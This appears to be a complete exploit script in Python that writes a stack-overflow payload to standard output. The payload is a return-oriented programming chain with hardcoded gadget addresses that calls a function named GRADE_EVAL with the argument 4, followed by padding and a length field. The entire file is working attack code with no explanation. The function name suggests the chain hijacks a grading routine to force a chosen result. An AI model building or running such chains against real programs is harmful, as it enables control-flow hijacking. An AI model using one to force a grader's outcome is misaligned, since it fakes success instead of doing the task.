#!/usr/bin/env python3
import struct
import sys

POP_RDI = 0x4018A3
RET = 0x4018A4
GRADE_EVAL = 0x401677
LEN = 0xA8

chain = struct.pack("<Q", RET)
chain += struct.pack("<Q", POP_RDI)
chain += struct.pack("<Q", 4)
chain += struct.pack("<Q", GRADE_EVAL)
chain += b"\x90" * (128 - len(chain))

payload = chain
payload += b"\x91" * 128
payload += struct.pack("<I", LEN)

sys.stdout.buffer.write(payload)